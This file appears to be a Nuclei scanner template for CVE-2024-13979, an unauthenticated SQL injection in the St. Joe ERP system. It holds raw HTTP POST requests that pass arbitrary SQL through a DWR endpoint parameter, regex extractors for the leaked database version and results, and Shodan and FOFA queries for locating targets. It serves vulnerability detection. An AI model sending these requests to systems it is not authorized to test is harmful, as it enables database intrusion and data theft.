id: CVE-2024-13979

info:
  name: St. Joe ERP System - SQL Injection
  author: anudeepadi
  severity: critical
  description: |
    St. Joe ERP system contains SQL injection vulnerability in the SingleRowQueryConvertor endpoint
    caused by improper sanitization of user input, allowing unauthenticated remote attackers to 
    execute arbitrary SQL commands and potentially extract sensitive information from the database.
  reference:
    - https://blog.csdn.net/qq_41904294/article/details/144240396
    - https://github.com/adysec/POC/blob/main/wpoc/%E5%9C%A3%E4%B9%94ERP/%E5%9C%A3%E4%B9%94ERP%E7%B3%BB%E7%BB%9FSingleRowQueryConvertor%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-13979
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 2
    shodan-query: title:"圣乔ERP系统"
    fofa-query: title="圣乔ERP系统"
  tags: cve,cve2024,sqli,stjoe,erp,dwr,unauth

http:
  - raw:
      - |
        POST /erp/dwr/call/plaincall/NamedParameterSingleRowQueryConvertor.queryForString.dwr HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
        Content-Type: text/plain
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.9
        Connection: close
        
        callCount=1
        windowName=
        c0-scriptName=NamedParameterSingleRowQueryConvertor
        c0-methodName=queryForString
        c0-id=0
        c0-param0=string:select%20@@version
        c0-param1=string:{}
        batchId=0
        page=/erp/login.action
        httpSessionId=
        scriptSessionId=

      - |
        POST /erp/dwr/call/plaincall/NamedParameterSingleRowQueryConvertor.queryForString.dwr HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
        Content-Type: text/plain
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.9
        Connection: close
        
        callCount=1
        windowName=
        c0-scriptName=NamedParameterSingleRowQueryConvertor
        c0-methodName=queryForString
        c0-id=0
        c0-param0=string:select%20database()
        c0-param1=string:{}
        batchId=1
        page=/erp/login.action
        httpSessionId=
        scriptSessionId=

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "dwr.engine._remoteHandleCallback"
          - "s0="
        condition: and

      - type: regex
        part: body
        regex:
          - 's0="[^"]+";'
          - 'Microsoft SQL Server \d{4}'
          - 'MySQL.*\d+\.\d+\.\d+'
          - 'Oracle.*\d+'
        condition: or

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: database_version
        part: body
        regex:
          - 's0="([^"]+)";'
        group: 1

      - type: regex
        name: sql_result
        part: body
        regex:
          - 'dwr.engine._remoteHandleCallback.*\{([^}]+)\}'
        group: 1
